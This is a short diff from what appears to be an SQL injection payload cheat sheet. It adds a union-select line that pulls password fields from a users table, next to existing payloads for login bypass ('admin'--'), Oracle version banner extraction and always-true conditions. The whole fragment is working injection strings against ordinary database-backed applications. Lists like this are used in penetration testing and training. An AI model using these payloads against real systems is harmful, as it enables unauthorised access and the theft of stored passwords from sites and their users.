@@ -6,6 +6,9 @@ admin'--     //Username input
 'union+select+null,banner+from+v$version-- // Oracle DB
 " or ""="
 SELECT name, type FROM USERS WHERE name LIKE "%1"; SELECT * FROM USERS WHERE "%"="%";
+'union+select+null,null||'~'||password+from+users--
+
+
 
 ```````````````````
 URL ENCODING FUNCTION
